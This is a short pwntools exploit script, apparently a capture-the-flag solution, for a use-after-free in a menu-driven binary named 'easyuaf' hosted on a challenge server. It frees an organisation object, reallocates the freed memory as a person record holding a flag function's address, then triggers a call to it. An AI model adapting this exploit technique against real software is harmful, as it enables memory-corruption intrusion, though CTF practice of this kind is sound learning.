from pwn import *
import sys

# --- setup ---
elf = context.binary = ELF('./easyuaf')
if sys.argv[1] == 'l':
    p = process()
    gdb.attach(p)
else:
    p = remote('challs.nusgreyhats.org', 10525)

# --- exploit ---
def alloc_person(p, id, personal_num, business_num):
    p.clean()
    name, age = 'PPPP', 200

    p.sendline(b'1')
    p.sendline(str(id))
    p.sendline(name)
    p.sendline(str(age))

    # stuff we want to control
    p.sendline(str(personal_num))
    p.sendline(str(business_num))

def alloc_org(p, id):
    p.clean()
    name, style = 'OOOO', 1

    p.sendline(b'2')
    p.sendline(str(id))
    p.sendline(name)
    p.sendline(str(style))

def free_org(p, id):
    p.clean()
    p.sendline(b'3')
    p.sendline(str(id))

def print_info(p, pid, oid):
    p.clean()
    p.sendline(b'4')
    p.sendline(str(pid))
    p.sendline(str(oid))

alloc_person(p, 0, 1, 2)
alloc_org(p, 0)
free_org(p, 0)

alloc_person(p, 1, elf.sym.ezflag, 0)
print_info(p, 0, 0)
p.interactive()
